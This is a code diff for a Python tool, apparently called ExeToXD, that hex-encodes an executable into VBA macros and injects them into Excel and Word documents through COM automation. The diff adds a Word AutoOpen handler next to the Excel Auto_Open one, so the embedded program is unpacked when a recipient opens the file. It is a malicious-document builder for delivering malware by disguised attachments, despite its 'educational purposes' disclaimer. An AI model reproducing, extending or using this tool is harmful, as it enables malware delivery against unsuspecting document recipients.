@@ -4,7 +4,7 @@
 # Author: OzoNeTT
 # Date: 23.01.2022
 #
-# Description: This script uses to injects an executable file to EXCEL document.
+# Description: This script uses to injects an executable file to office documents.
 #
 # NOTICE: Use it only for educational purposes, do not distribute or use it for a malicious payload delivery
 # to another users. Just for self-practicing!
@@ -44,9 +44,20 @@ HEXDECODE = """Public Function HexDecode(sData As String) As String
 End Function
 
 
+"""
+
+
+OPEN_TYPE = {
+    "docm": """
+Sub AutoOpen()
+
+""",
+    "xlsm": """
 Private Sub Auto_Open()
 
 """
+
+}
 
 parser = argparse.ArgumentParser(description="-= ExeToXD v0.2 =-")
 parser.add_argument("--xlsm", dest="xlsm", const='', help="Insert VB script to xlsm", required=False, action="store_const")
@@ -54,11 +65,13 @@ parser.add_argument("--docm", dest="docm", const='', help="Insert VB script to d
 parser.add_argument("-i", dest="input", help="Input file", required=True)
 
 
-def process_macro(filename):
+def process_macro(filename, type):
     text = open(filename, 'rb').read()
     macro = open(os.path.join(OUT_DIR, 'macros.txt'), 'w')
 
     macro.write(HEXDECODE)
+
+    macro.write(OPEN_TYPE.get(type))
 
     rowcount = math.ceil(len(text) / 500)
     macro.write("Dim codes(1 To " + str(rowcount) + ") As String\n")
@@ -105,6 +118,7 @@ def create_document(file, type):
         com_instance.Visible = False
         worddoc = com_instance.Documents.Add()
         worddoc.SaveAs(file, FileFormat=13)
+
         com_instance.Quit()
 
 
@@ -205,7 +219,7 @@ def include_office(file, type, creation_flag):
         if type == 'xlsm':
             objworkbook.SaveAs(file, None, '', '')
         elif type == 'docm':
-            objworkbook.SaveAs(file, FileFormat=13)
+            com_instance.ActiveDocument.SaveAs(file, FileFormat=13)
         time.sleep(1)
     except Exception:
         print(f'[FAILED]')
@@ -218,6 +232,16 @@ def include_office(file, type, creation_flag):
 def processing_xlsm(args, creation):
     print(f'Start EXE to XLSM...\n')
 
+    print(f'{"Creating VBA script for XLSM...":32}', end='')
+    try:
+        process_macro(args.input, "xlsm")
+    except Exception:
+        print('Error occurred while creating VBA macros!')
+        exit(1)
+
+    print(f'[DONE]\n')
+
+
     print(f'Inserting VBA script to XLSM:')
     try:
         include_office(os.path.join(OUT_DIR, args.xlsm), "xlsm", creation)
@@ -229,6 +253,15 @@ def processing_xlsm(args, creation):
 
 def processing_docm(args, creation):
     print(f'Start EXE to DOCM...\n')
+
+    print(f'{"Creating VBA script for DOCM...":32}', end='')
+    try:
+        process_macro(args.input, "docm")
+    except Exception:
+        print('Error occurred while creating VBA macros!')
+        exit(1)
+
+    print(f'[DONE]\n')
 
     print(f'Inserting VBA script to DOCM:')
     try:
@@ -244,15 +277,6 @@ def processing(args):
     if not args.xlsm and not args.docm:
         print('No office tags specified. Just creating macros')
 
-
-    print(f'{"Creating VBA script...":32}', end='')
-    try:
-        process_macro(args.input)
-    except Exception:
-        print('Error occurred while creating VBA macros!')
-        exit(1)
-
-    print(f'[DONE]\n')
 
     if args.xlsm is not None and args.docm is None:
         creation = False
